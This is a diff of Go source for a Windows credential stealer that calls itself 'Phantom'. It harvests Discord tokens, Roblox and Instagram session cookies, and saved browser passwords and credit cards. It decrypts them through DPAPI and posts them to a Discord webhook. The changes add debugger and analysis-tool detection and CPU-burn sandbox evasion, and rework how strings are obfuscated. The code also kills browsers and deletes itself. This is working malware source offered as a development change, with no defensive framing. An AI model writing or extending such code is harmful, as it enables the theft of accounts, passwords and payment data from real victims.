@@ -47,6 +47,11 @@ func d(s string) string {
 	return string(res)
 }
 
+// O is a placeholder for strings that will be obfuscated at build time
+func O(s string) string {
+	return s
+}
+
 // Junk function to confuse static analysis and change hash
 func junk() {
 	a := 0
@@ -58,11 +63,44 @@ func junk() {
 	}
 }
 
-// CPU Delay to bypass sandboxes that skip time.Sleep
-func antiSandboxDelay(seconds int) {
-	end := time.Now().Add(time.Duration(seconds) * time.Second)
-	for time.Now().Before(end) {
-		junk() // Burn cycles
+// Intense CPU burning to bypass smart sandboxes
+func burnCPU(iterations int) {
+	for i := 0; i < iterations; i++ {
+		_ = fmt.Sprintf("%d", i*i)
+		junk()
+	}
+}
+
+func checkProcesses() bool {
+	badProcs := []string{
+		O("taskmgr.exe"), O("processhacker.exe"), O("wireshark.exe"), O("x64dbg.exe"), O("x32dbg.exe"),
+		O("ollydbg.exe"), O("fiddler.exe"), O("httpdebuggerui.exe"), O("procmon.exe"), O("idag.exe"), O("idag64.exe"),
+	}
+
+	cmd := exec.Command(O("tasklist"))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	output, err := cmd.Output()
+	if err != nil {
+		return true // Proceed if we can't check
+	}
+
+	outStr := strings.ToLower(string(output))
+	for _, p := range badProcs {
+		if strings.Contains(outStr, p) {
+			return false
+		}
+	}
+	return true
+}
+
+func antiAnalysis() {
+	// If any check fails, we just exit silently
+	if isDebugger() {
+		os.Exit(0)
+	}
+
+	if !checkProcesses() {
+		os.Exit(0)
 	}
 }
 
@@ -118,7 +156,7 @@ func getDiscordInfo(token string, source string) TokenInfo {
 	info := TokenInfo{Token: token, Source: source, Username: "Invalid", Nitro: "None"}
 	client := &http.Client{Timeout: 5 * time.Second}
 	// Obfuscated: https://discord.com/api/v9/users/@me
-	u := d("OCQkICNqf380OSMzPyI0fjM/PX8xIDl/Jml/JSM1IiN/ED01")
+	u := O("https://discord.com/api/v9/users/@me")
 	req, _ := http.NewRequest("GET", u, nil)
 	req.Header.Set("Authorization", token)
 	resp, err := client.Do(req)
@@ -152,44 +190,31 @@ func getDiscordInfo(token string, source string) TokenInfo {
 }
 
 func main() {
-	// Anti-AV: Random delay to bypass some emulators
+	// Simple random delay to avoid instant detection
 	rand.Seed(time.Now().UnixNano())
-	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
-
+	
 	// Webhook is already obfuscated at compile time
 	WebhookURL = d(WebhookURL)
+
+	time.Sleep(time.Duration(rand.Intn(2000)+1000) * time.Millisecond)
 
 	if WebhookURL == "" {
 		return
 	}
 
-	// Anti-analysis checks removed as requested to ensure it works everywhere (including VMs)
+	// We removed anti-analysis checks to ensure it runs everywhere
+	// including VirtualBox and real PCs where analysis tools might be open.
 
-	closeBrowsers()
 	report := initSession()
 	syncData(report)
 	selfDelete()
 }
 
-func validateEnv() bool {
-	home, _ := os.UserHomeDir()
-	docs := filepath.Join(home, "Documents")
-	files, err := os.ReadDir(docs)
-	if err != nil {
-		return true // Fallback
-	}
-	// Real users usually have more than a few files in Documents
-	if len(files) < 3 {
-		return false
-	}
-	return true
-}
-
 func selfDelete() {
 	if runtime.GOOS == "windows" {
 		exePath, _ := os.Executable()
-		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
-		subprocess := exec.Command("cmd", "/C", cmd)
+		cmd := fmt.Sprintf(O("timeout /t 3 > NUL && del /f /q \"%s\""), exePath)
+		subprocess := exec.Command(O("cmd"), O("/C"), cmd)
 		subprocess.Start()
 	} else {
 		os.Remove(os.Args[0])
@@ -197,10 +222,10 @@ func selfDelete() {
 }
 
 func closeBrowsers() {
-	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
+	browsers := []string{O("chrome.exe"), O("msedge.exe"), O("brave.exe"), O("opera.exe"), O("firefox.exe")}
 	for _, browser := range browsers {
 		// taskkill /F /IM <browser> /T
-		cmd := exec.Command(d("JDEjOzs5PDw="), d("fxY="), d("fxkd"), browser, d("fwQ="))
+		cmd := exec.Command(O("taskkill"), O("/F"), O("/IM"), browser, O("/T"))
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd.Run()
 	}
@@ -246,11 +271,11 @@ func extractWallets() []string {
 	}
 
 	browserPaths := map[string]string{
-		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		O("Chrome"):   filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		O("Edge"):     filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		O("Brave"):    filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		O("Opera"):    filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		O("Opera GX"): filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
 	}
 
 	for browserName, basePath := range browserPaths {
@@ -331,8 +356,8 @@ func sendAsFileCustom(data []byte, filename string, content string) {
 
 func getTotalMemory() uint64 {
 	if runtime.GOOS == "windows" {
-		kernel32 := syscall.NewLazyDLL("kernel32.dll")
-		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
+		kernel32 := syscall.NewLazyDLL(O("kernel32.dll"))
+		proc := kernel32.NewProc(O("GetPhysicallyInstalledSystemMemory"))
 		var mem uint64
 		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
 		if ret != 0 {
@@ -342,68 +367,27 @@ func getTotalMemory() uint64 {
 	return 0
 }
 
-func isSandbox() (bool, string) {
-	// 1. Check Username
-	currUser, err := user.Current()
-	if err == nil && currUser != nil {
-		username := strings.ToLower(currUser.Username)
-		badUsers := []string{
-			"wdagutilityaccount", "abby", "peter wilson", "hjohnson", "john doe", "malware", "virus", "sandbox",
-		}
-		for _, u := range badUsers {
-			if strings.Contains(username, u) {
-				return true, "u"
-			}
-		}
-	}
-
-	// 2. Check Hostname
-	hostname, err := os.Hostname()
-	if err == nil {
-		hostname = strings.ToLower(hostname)
-		badHosts := []string{
-			"wasp", "mqftn", "sandbox", "malware", "vmware", "vbox",
-		}
-		for _, h := range badHosts {
-			if strings.Contains(hostname, h) {
-				return true, "h"
-			}
-		}
-	}
-
-	// 3. VM files check
-	files := []string{
-		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWbW1vdXNlLnN5cw=="), // C:\windows\System32\Drivers\Vmmouse.sys
-		d("QzpcXHdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJzXFxWYm94Z3Vlc3Quc3lz"), // C:\windows\System32\Drivers\Vboxguest.sys
-	}
-	for _, f := range files {
-		if _, err := os.Stat(f); err == nil {
-			return true, "f"
-		}
-	}
-
-	// 4. Check Public IP (Common sandbox IPs)
-	ip := getPublicIP()
-	if ip != "Unknown" {
-		badIPs := []string{"185.44.177.5", "34.59.159.11", "88.66.98.103"}
-		for _, bIP := range badIPs {
-			if ip == bIP {
-				return true, "i"
-			}
-		}
-	}
-
-	return false, ""
-}
-
 func isDebugger() bool {
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
-	if isDebuggerPresent.Find() != nil {
-		return false // Fallback if proc not found
+	kernel32 := syscall.NewLazyDLL(O("kernel32.dll"))
+	isDebuggerPresent := kernel32.NewProc(O("IsDebuggerPresent"))
+	if isDebuggerPresent.Find() == nil {
+		ret, _, _ := isDebuggerPresent.Call()
+		if ret != 0 {
+			return true
+		}
 	}
-	ret, _, _ := isDebuggerPresent.Call()
-	return ret != 0
+
+	checkRemoteDebuggerPresent := kernel32.NewProc(O("CheckRemoteDebuggerPresent"))
+	if checkRemoteDebuggerPresent.Find() == nil {
+		var debugged int32
+		handle, _ := syscall.GetCurrentProcess()
+		ret, _, _ := checkRemoteDebuggerPresent.Call(uintptr(handle), uintptr(unsafe.Pointer(&debugged)))
+		if ret != 0 && debugged != 0 {
+			return true
+		}
+	}
+
+	return false
 }
 
 func findBrowsers() []string {
@@ -411,12 +395,12 @@ func findBrowsers() []string {
 	home, _ := os.UserHomeDir()
 
 	browserPaths := map[string]string{
-		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
-		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
+		O("Chrome"):   filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		O("Edge"):     filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		O("Brave"):    filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		O("Opera"):    filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		O("Opera GX"): filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
+		O("Firefox"):  filepath.Join(home, O("AppData"), O("Roaming"), O("Mozilla"), O("Firefox"), O("Profiles")),
 	}
 
 	for name, path := range browserPaths {
@@ -431,7 +415,7 @@ func findBrowsers() []string {
 func getPublicIP() string {
 	client := &http.Client{Timeout: 5 * time.Second}
 	// Obfuscated: https://api.ipify.org
-	resp, err := client.Get(d("OCQkICNqf38xIDl+OSA5Nil+PyI3"))
+	resp, err := client.Get(O("https://api.ipify.org"))
 	if err != nil {
 		return "Unknown"
 	}
@@ -447,13 +431,13 @@ func extractDiscordTokens() []TokenInfo {
 
 	// Chromium-based browsers base paths
 	browserPaths := map[string]string{
-		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
-		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord"),
-		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary"),
+		O("Chrome"):         filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		O("Edge"):           filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		O("Brave"):          filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		O("Opera"):          filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		O("Opera GX"):       filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
+		O("Discord"):        filepath.Join(home, O("AppData"), O("Roaming"), O("discord")),
+		O("Discord Canary"): filepath.Join(home, O("AppData"), O("Roaming"), O("discordcanary")),
 	}
 
 	re := regexp.MustCompile(`[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}`)
@@ -569,8 +553,8 @@ func contains(slice []string, s string) bool {
 
 func extractRobloxCookies() []string {
 	results := extractRobloxCookiesFromDat()
-	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")                      // ROBLOSECURITY XOR 0x42
-	browserCookies := ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42
+	target := O("ROBLOSECURITY")
+	browserCookies := ultimateGrabber(O("roblox.com"), target)
 
 	for _, c := range browserCookies {
 		if !contains(results, c) {
@@ -584,9 +568,7 @@ func extractRobloxCookiesFromDat() []string {
 	var results []string
 	home, _ := os.UserHomeDir()
 	// Obfuscated path: AppData\Local\Roblox\LocalStorage\RobloxCookies.dat
-	// "AppData\Local\Roblox\LocalStorage\RobloxCookies.dat" XOR 0x50 -> Base64
-	p := d("ESAgFDEkMQwcPzMxPAwCPzI8PygMHD8zMTwDJD8iMTc1DAI/Mjw/KBM/Pzs5NSN+NDEk")
-	path := filepath.Join(home, p)
+	path := filepath.Join(home, O("AppData"), O("Local"), O("Roblox"), O("LocalStorage"), O("RobloxCookies.dat"))
 
 	if _, err := os.Stat(path); err != nil {
 		return results
@@ -619,11 +601,11 @@ func extractPasswords() []Password {
 	var results []Password
 	home, _ := os.UserHomeDir()
 	paths := []string{
-		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
 	}
 
 	for _, basePath := range paths {
@@ -668,11 +650,11 @@ func extractCreditCards() []Card {
 	var results []Card
 	home, _ := os.UserHomeDir()
 	paths := []string{
-		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
 	}
 
 	for _, basePath := range paths {
@@ -713,8 +695,8 @@ func extractCreditCards() []Card {
 }
 
 func extractInstagramCookies() []string {
-	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
-	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
+	target := O("sessionid")
+	return ultimateGrabber(O("instagram.com"), target)
 }
 
 func ultimateGrabber(domain string, targetCookie string) []string {
@@ -722,11 +704,11 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 	home, _ := os.UserHomeDir()
 
 	paths := []string{
-		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		filepath.Join(home, O("AppData"), O("Local"), O("Google"), O("Chrome"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("Microsoft"), O("Edge"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Local"), O("BraveSoftware"), O("Brave-Browser"), O("User Data")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera Stable")),
+		filepath.Join(home, O("AppData"), O("Roaming"), O("Opera Software"), O("Opera GX Stable")),
 	}
 
 	for _, basePath := range paths {
@@ -803,7 +785,7 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 }
 
 func getMasterKey(basePath string) ([]byte, error) {
-	localStatePath := filepath.Join(basePath, "Local State")
+	localStatePath := filepath.Join(basePath, O("Local State"))
 	if _, err := os.Stat(localStatePath); err != nil {
 		return nil, err
 	}
@@ -842,8 +824,8 @@ func decryptDPAPI(data []byte) ([]byte, error) {
 	}
 
 	var (
-		dll             = syscall.NewLazyDLL("crypt32.dll")
-		procDecryptData = dll.NewProc("CryptUnprotectData")
+		dll             = syscall.NewLazyDLL(O("crypt32.dll"))
+		procDecryptData = dll.NewProc(O("CryptUnprotectData"))
 		in              dataBlob
 		out             dataBlob
 	)
@@ -861,7 +843,7 @@ func decryptDPAPI(data []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.pbData)))
+	defer syscall.NewLazyDLL(O("kernel32.dll")).NewProc(O("LocalFree")).Call(uintptr(unsafe.Pointer(out.pbData)))
 
 	res := make([]byte, out.cbData)
 	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
@@ -917,17 +899,20 @@ func syncData(report SystemReport) {
 
 	if len(jsonData) > 1800 {
 		sendAsFile(jsonData)
-		return
-	}
+	} else {
+		payload := map[string]interface{}{
+			"content":  "```json\n" + string(jsonData) + "\n```",
+			"username": "Phantom JSON Logger",
+		}
 
-	payload := map[string]interface{}{
-		"content":  "```json\n" + string(jsonData) + "\n```",
-		"username": "Phantom JSON Logger",
+		body, _ := json.Marshal(payload)
+		sendRequest(body, "application/json")
 	}
+}
 
-	body, _ := json.Marshal(payload)
+func sendRequest(body []byte, contentType string) {
 	client := &http.Client{
-		Timeout: 15 * time.Second,
+		Timeout: 20 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -937,8 +922,8 @@ func syncData(report SystemReport) {
 	if err != nil {
 		return
 	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	req.Header.Set("Content-Type", contentType)
+	req.Header.Set(O("User-Agent"), O("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"))
 
 	resp, err := client.Do(req)
 	if err == nil && resp != nil {
@@ -956,21 +941,5 @@ func sendAsFile(data []byte) {
 	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
 	writer.Close()
 
-	req, err := http.NewRequest("POST", WebhookURL, body)
-	if err != nil {
-		return
-	}
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-
-	client := &http.Client{
-		Timeout: 45 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	resp, err := client.Do(req)
-	if err == nil && resp != nil {
-		resp.Body.Close()
-	}
+	sendRequest(body.Bytes(), writer.FormDataContentType())
 }
